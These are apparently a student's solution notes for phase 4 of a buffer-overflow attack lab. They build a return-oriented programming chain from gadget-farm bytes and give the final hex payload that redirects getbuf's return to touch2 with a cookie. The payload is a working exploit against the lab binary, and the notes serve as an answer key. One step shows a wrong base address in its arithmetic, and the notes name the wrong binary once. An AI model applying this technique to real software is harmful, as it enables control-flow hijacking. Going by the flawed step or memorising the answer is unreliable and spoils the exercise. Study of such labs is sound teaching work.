phase 4
want to execute code for touch2 when return from getbuf and pass our cookie to touch2
want to transfer return control to touch2
gadgets = what you want code to do, use the tables given in the spec
First write assembly code to go to touch2
The point of ROP is to utilize assembly code already in the progam to execute certain instructions, don't ned to write an of your own code
So assembly code:
pop rdi = 5f COULDN'T FIND IN RTARGET GADGET FARM so do pop rax instead
pop rax = 58 
mov rax rdi = 48 89 c7 c3
Look for those bytes in your gadget farm 
pop rax:
00000000004019d3 <setval_350>:
  4019d3:       c7 07 2f 5c 2f 58       movl   $0x582f5c2f,(%rdi)
  4019d9:       c3                      retq
6th byte is 58 so do 4019d3 + 5 = 4019d8

mov rax rdi:
00000000004019e0 <setval_323>:
  4019e0:       c7 07 48 89 c7 c3       movl   $0xc3c78948,(%rdi)
  4019e6:       c3                      retq
3rd byte is beginning of sequence so do 4019d3 + 2 = 4019e2

cd target81
gdb ctarget
Disas getbuf
getbuf()
 0x000000000040181b <+0>:     sub    $0x18,%rsp
 0x000000000040181f <+4>:     mov    %rsp,%rdi
 0x0000000000401822 <+7>:     callq  0x401a5a <Gets>
 0x0000000000401827 <+12>:    mov    $0x1,%eax
 0x000000000040182c <+17>:    add    $0x18,%rsp
 0x0000000000401830 <+21>:    retq

Disas touch2:
touch2()
 0x000000000040185d <+0>:     sub    $0x8,%rsp
 0x0000000000401861 <+4>:     mov    %edi,%esi
 0x0000000000401863 <+6>:     movl   $0x2,0x202c8f(%rip)        # 0x6044fc <vlevel>
 0x000000000040186d <+16>:    cmp    0x202c91(%rip),%edi        # 0x604504 <cookie>
 0x0000000000401873 <+22>:    jne    0x401890 <touch2+51>
 0x0000000000401875 <+24>:    mov    $0x402fe8,%edi
 0x000000000040187a <+29>:    mov    $0x0,%eax
 0x000000000040187f <+34>:    callq  0x400c80 <printf@plt>
 0x0000000000401884 <+39>:    mov    $0x2,%edi
 0x0000000000401889 <+44>:    callq  0x401c49 <validate>
 0x000000000040188e <+49>:    jmp    0x4018a9 <touch2+76>
 0x0000000000401890 <+51>:    mov    $0x403010,%edi
 0x0000000000401895 <+56>:    mov    $0x0,%eax
 0x000000000040189a <+61>:    callq  0x400c80 <printf@plt>
 0x000000000040189f <+66>:    mov    $0x2,%edi
 0x00000000004018a4 <+71>:    callq  0x401cfb <fail>
 0x00000000004018a9 <+76>:    mov    $0x0,%edi
 0x00000000004018ae <+81>:    callq  0x400df0 <exit@plt>
Solution:
padding
gadget 1
cookie
gadget 2
touch2 address

Solution:
00 00 00 00 00 00 00 00 //padding
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
d8 19 40 00 00 00 00 00 //gadget1
d7 8a a2 6e 00 00 00 00 //cookie
e2 19 40 00 00 00 00 00 //gadget2
5d 18 40 00 00 00 00 00 //touch2 address